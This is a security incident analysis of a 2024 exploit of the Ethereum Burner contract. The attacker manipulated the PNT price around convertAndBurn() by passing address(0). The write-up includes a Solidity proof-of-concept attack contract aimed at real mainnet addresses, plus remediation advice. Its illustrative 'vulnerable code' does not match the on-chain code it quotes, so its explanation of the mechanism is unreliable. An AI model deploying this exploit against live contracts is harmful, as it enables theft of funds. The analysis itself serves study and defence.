# Burner — convertAndBurn() Null Token Address Handling Flaw Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | Burner |
| **Chain** | Ethereum |
| **Loss** | ~1.7 ETH |
| **Vulnerable Contract** | [Burner 0x4d4d05e1](https://etherscan.io/address/0x4d4d05e1205e3A412ae1469C99e0d954113aa76F) |
| **PNT Token** | [0x89Ab3215](https://etherscan.io/address/0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD) |
| **Root Cause** | The `convertAndBurn(address[] calldata tokens)` function accepts `address(0)` as a token address, causing ETH/token balance calculation errors during null address processing, which enabled PNT price manipulation followed by profit extraction |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Burner_exp.sol) |

---

## 1. Vulnerability Overview

The `convertAndBurn()` function of the Burner contract iterates over an array of token addresses to perform conversion/burn operations, but contains a flaw in its `address(0)` handling logic. The attacker called `convertAndBurn()` with a token array containing a null address to distort internal balance calculations, and combined this with PNT token price manipulation to realize approximately 1.7 ETH in profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: convertAndBurn allows address(0)
contract Burner {
    function convertAndBurn(address[] calldata tokens) external {
        for (uint i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == address(0)) {
                // ETH handling — balance calculation error
                uint256 ethBal = address(this).balance;
                // ← ETH conversion can be distorted under manipulated state
                _burnETH(ethBal);
            } else {
                uint256 tokenBal = IERC20(token).balanceOf(address(this));
                _convertAndBurn(token, tokenBal);
            }
        }
    }
}

// ✅ Safe code: explicitly block null addresses
function convertAndBurn(address[] calldata tokens) external {
    for (uint i = 0; i < tokens.length; i++) {
        require(tokens[i] != address(0), "null token address");
        uint256 tokenBal = IERC20(tokens[i]).balanceOf(address(this));
        if (tokenBal > 0) {
            _convertAndBurn(tokens[i], tokenBal);
        }
    }
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: Burner.sol
    function convertAndBurn(address [] calldata tokens) external {  // ❌ Vulnerability
        for (uint i = 0; i < tokens.length; i++) {
            _convert(tokens[i]);
        }
        burn();
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Acquire 70 ETH + convert ETH → WETH
  │
  ├─→ [2] Swap WETH → PNT (Uniswap V2)
  │         └─ PNT price increases
  │
  ├─→ [3] Call convertAndBurn([address(0), ...])
  │         └─ Internal calculation distorted during null address processing
  │         └─ Contract ETH balance processed incorrectly
  │
  ├─→ [4] Swap PNT → WETH in reverse (at manipulated price)
  │
  └─→ [5] ~1.7 ETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IBurner {
    function convertAndBurn(address[] calldata tokens) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external payable;
}

contract AttackContract {
    IBurner  constant burner  = IBurner(0x4d4d05e1205e3A412ae1469C99e0d954113aa76F);
    IUniswapV2Router constant router = IUniswapV2Router(/* Uniswap V2 Router */);
    IERC20   constant PNT    = IERC20(0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD);
    IERC20   constant WETH   = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testExploit() external payable {
        // [1] Swap ETH → PNT (price manipulation)
        address[] memory pathBuy = new address[](2);
        pathBuy[0] = address(WETH); pathBuy[1] = address(PNT);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 70 ether}(
            0, pathBuy, address(this), block.timestamp
        );

        // [2] Call convertAndBurn with array containing address(0)
        address[] memory tokens = new address[](2);
        tokens[0] = address(0);  // null address → distorts internal calculation
        tokens[1] = address(PNT);
        burner.convertAndBurn(tokens);

        // [3] Swap PNT → WETH in reverse
        uint256 pntBal = PNT.balanceOf(address(this));
        PNT.approve(address(router), pntBal);
        address[] memory pathSell = new address[](2);
        pathSell[0] = address(PNT); pathSell[1] = address(WETH);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            pntBal, 0, pathSell, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Null address input handling flaw |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (null address injection via convertAndBurn) |
| **DApp Category** | Token burn utility contract |
| **Impact** | ETH theft via internal calculation distortion (~1.7 ETH) |

## 6. Remediation Recommendations

1. **Null address validation**: Immediately check that each token address in the array is not `address(0)`
2. **Skip zero balances**: Skip processing for tokens with a zero held balance
3. **Separate ETH/token handling**: Split ETH and ERC20 token handling into separate functions to prevent mixing
4. **Input array whitelist**: Process only addresses from an approved token address list

## 7. Lessons Learned

- Input validation for each element is essential in functions that process array inputs; in particular, `address(0)` must always be blocked.
- The pattern where a null address triggers an ETH processing branch is a recurring risk in contracts that handle both tokens and ETH.
- Even a small loss (1.7 ETH) could have been prevented with a single null address check.